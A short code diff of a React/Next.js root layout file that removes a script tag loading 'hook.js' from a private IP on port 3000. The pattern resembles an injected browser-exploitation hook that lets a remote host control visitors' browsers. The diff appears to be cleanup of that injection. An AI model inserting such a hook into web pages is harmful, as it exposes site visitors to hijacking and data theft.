@@ -19,7 +19,6 @@ export default function RootLayout({
         <SnowAnimation />
         {children}
       </body>
-      <script src="http://192.168.1.130:3000/hook.js"></script>
     </html>
   );
 }
